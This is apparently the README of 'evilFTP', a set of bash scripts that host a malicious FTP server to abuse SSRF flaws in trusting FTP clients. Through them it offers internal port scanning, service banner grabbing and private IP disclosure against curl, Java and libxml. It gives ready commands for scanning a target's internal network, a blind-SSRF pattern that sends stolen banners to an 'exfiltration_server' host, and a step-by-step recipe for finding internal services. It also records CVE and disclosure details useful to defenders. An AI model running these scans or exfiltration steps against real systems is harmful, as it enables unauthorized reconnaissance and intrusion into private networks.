evilFTP is a set of scripts implementing some attacks against overly trusting FTP clients to extend our capabilities when exploiting Server-Side Request Forgery (SSRF) issues. 

A malicious FTP server is hosted by the scripts and all it takes to run the attacks is to have the client interact with the FTP server (e.g. download a file, list the contents of a directory). Even though the prerequisites are simple, it's not very common in practice to have an attacker with the capability of directing a client to interact with an FTP server. Amongst the few cases where this is possible is within the context of web browsers, since the contents of a page can be controlled by the attacker and may contain references to resources hosted by an FTP server. Another interesting case is when we are dealing with an SSRF issue which is also the primary target of evilFTP. With evilFTP and given an SSRF, one could also get:
1. Reliable TCP Port Scanning
2. TCP Service Banner Disclosure
3. Server Private IP Disclosure

## Reliable TCP Port Scanning (ssrf_pasvaggresvftp.sh):
This is a variation of the FTP bounce attack but instead of using the active mode, since we are attacking the client, we are using the passive mode.
The key element to run this attack is to have the client establish the data channel through the PASV command. The PASV is the most commonly supported command that allows the server to specify the IP and PORT where the client has to connect to establish the data channel and receive the requested data. To perform the port scanning, the malicious server simply sets the IP and PORT to the target we want to test. Then based on the response of the FTP client we can determine the status of the port:
1. Open Port: the client will normally send a command after the PASV response
```
> [...SNIP...]
> PASV in 6ms
< 227 Entering PASSIVE Mode (172,17,0,1,31,68)
> **RETR** afile in 5ms
```

2. Closed Port: the client will most likely terminate the control channel connection immediately after the PASV response 
```
> [...SNIP...]
> PASV in 5ms
< 227 Entering PASSIVE Mode (172,17,0,1,31,69)
> in **33ms**
```

3. Filtered Port: typically the control channel connection will hang
```
> [...SNIP...]
> PASV in 5ms
< 227 Entering PASSIVE Mode (172,17,0,1,31,70)
> in **1009ms** (with 1s timeout)
```

Usage:

Testing the script with some externally reachable hosts using dockerized curl:
```bash
./pasvaggresvFTP.sh -t 17.32.208.224/31 -p 80,140-145,443 -x ./dispatcher_examples/testing_ssrf_curl_port.sh
```

Scanning the internal network of a target:
```bash
./pasvaggresvFTP.sh -t 10.0.0.0/25 -p 22,8000-9000 -x ./dispatcher_examples/target_ssrf_port.sh
```

<p align="center">
  <img width="680" src="images/port.gif"/>
</p>

## TCP Service Banner Disclosure:

This is based on the same foundations as the port scanner. The only difference is that we go one step further and attempt to recover the banner of the TCP service.
So again the client is directed to retrieve for example a file from our FTP server from where is directed to establish the data channel to the target IP:PORT. If a service that responds with a banner is listening to that port, then the client will read that response as the contents of the file requested earlier on. Now depending on the kind of SSRF we have, there are two possibilities for actually getting back that banner from the FTP client:
1. Non-Blind SSRF: extracting the banner is trivial, we simply point the client to ftp://evilFTP/whatever and the banner should be returned in the response since is a non-blind SSRF. The banner extraction should be performed within the dispatcher based on the HTML response.
2. Blind SSRF: here the extraction of the banner takes two steps. First, we get the banner response from the TCP service and then we issue another request to exfiltrate that response. This process may look like this:
```
banner=$(ssrf ftp://evilFTP/IP/PORT/file)
ssrf http://exfiltration_server/$banner
```

Since we need a state to be kept between the two SSRF calls, it should not be possible to exfiltrate banners through basic SSRF.
But is possible to achieve this with the SSRF through XXE which is implemented in the xxe_bannerFTP.sh

Usage:

For the non-blind SSRF, we simply use the pasvaggresvFTP:
```bash
./pasvaggresvFTP.sh -t 10.0.0.0/25 -p 100-200 -x ./dispatcher_examples/target_ssrf_nonblind_banner.sh -q 20
```

Testing the blind SSRF through XXE using a dockerized java client:
```bash
./xxe_bannerFTP.sh -t 17.32.208.224/30 -p 140-145 -x ./dispatcher_examples/testing_xxe_blind_java_banner.sh -q 20
```

Extracting the banners of a target network:
```bash
./xxe_bannerFTP.sh -t 10.0.0.0/25 -p 100-200 -x ./dispatcher_examples/target_xxe_blind_banner.sh -q 20
```

It is noted that the FTP client will normally wait for the data channel connection to time out before returning the data. To avoid this delay, the parameter q is passed to the script which indicates the number of bytes the client should expect on the data channel. This number is passed in the response of the SIZE and RETR commands and allows the client to end the connection as soon as the specified numbers of bytes are received.

<p align="center">
  <img width="680" src="images/banner.gif"/>
</p>

## Private IP Disclosure (ssrf_leakyftp.sh):

Here we try to have the client use the active mode to establish the data channel by rejecting any commands that attempt to establish a passive mode channel. In active mode (e.g. commands PORT, EPRT, LPRT) the client is expected to send the IP where it listens to receive the requested data. That IP should be the private IP on the interface used to establish the control channel with the FTP server.

Usage:
```bash
./leakyFTP
```

The directory edgyFTP contains a modified version of leakyFTP that works on IE/Edge (pre-chromium)

## Brief overview of the affected clients

|                       | curl[1]      | Java Oracle FTP Client[2] | .NET * FTP Client   |  libxml[3]  | (headless) browsers   | IE/Edge (pre-chromium)  | *[4] |
| -------------         |:-----------: |:------------------------: |:------------------: |:-------: | :-------------------: | :--------------------:  | :--: |
| Port Scanning         | ✔           | ✔                         |       ❌            |  ✔      |    ❌                  |  ❌                     | ✔    |
| Banner Disclosure     | ✔           | ✔ [5]                     |       ❌            |  ✔      |    ❌                  |  ❌                     | ✔    |
| Private IP Disclosure | ❌           | ✔                         |       ❌            |  ❌      |    ❌                  |  ✔                     | ✓    |

[1] curl fixed the issues in version 7.74.0 ([CVE-2020-8284](https://hackerone.com/reports/1040166))

[2] The issues with the Java Oracle FTP client will be resolved in a future update.

[3] Opened an issue [here](https://gitlab.gnome.org/GNOME/libxml2/-/issues/209)

[4] This is what one can expect from the rest of the FTP clients

[5] Java makes use of MeteredStream and doesn't completely respect the value provided in the -q parameter. The value provided in the -q parameter is most likely rounded to the nearest multiple of the size of the internally used buffer in the MeteredStream class.

## FAQ
<pre>
> Why in bash?
< I didn't know if it was possible to do it in bash

> Was it possible?
< Probably not

> What is the dispatcher?
< The dispatcher is the script that triggers the SSRF issue and is called internally by the evilFTP scripts. 
  It's the same concept used in <a href="https://github.com/vp777/procrustes">procrustes</a>/<a href="https://github.com/vp777/metahttp">metahttp</a>. Check the dispatcher_examples directory for some examples.

> How can i use this?
< This is how i used it:

1. Get the private IP of the server. This can be accomplished by using the leakyFTP, reading the hosts file, or using any other technique.
2. Using the IP found in (1) estimate the network ranges in use
3. Use the identified network ranges to scan the internal network of the target for some  <a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/">interesting services</a>
Extra: depending on the service, you can use the banner disclosure to verify the target or just to prove the impact of the SSRF issue.
Bonus: in case we are dealing specifically with XXE, one can also use <a href="https://github.com/vp777/metahttp">metahttp</a> to identify potentially interesting resources. 
It is noted that since metahttp can also scan hostnames, one can replace the first two steps described here with the generation of hostnames that might resolve to the IP of the target service. evilFTP and metahttp were created at the same time and were originally part of the same repository.

Example:
Assuming we are hunting for some solr instances which we know they run on port 8983 and would normally host a resource under the path: /solr/admin/cores
Then it's possible to identify that host by running either:

./pasvaggresvFTP.sh -t 10.0.0.0/25 -p 8983 -x ./dispatcher_examples/target.sh
or
./metahttp.sh -t 10.10.0.0/25 -p 8983 -x ./dispatcher_examples/target.sh -a /solr/admin/cores

</pre>

## Interesting resources
https://hackerone.com/reports/1040166

https://bugzilla.mozilla.org/show_bug.cgi?id=370559

https://github.com/chromium/chromium/commit/a1cea36673186829ab5d1d1408ac50ded3ca5850

https://web.archive.org/web/20070317052623/http://bindshell.net/papers/ftppasv/ftp-client-pasv-manipulation.pdf

https://soroush.secproject.com/blog/2009/11/finding-vulnerabilities-of-yaftp-1-0-14-a-client-side-ftp-application/
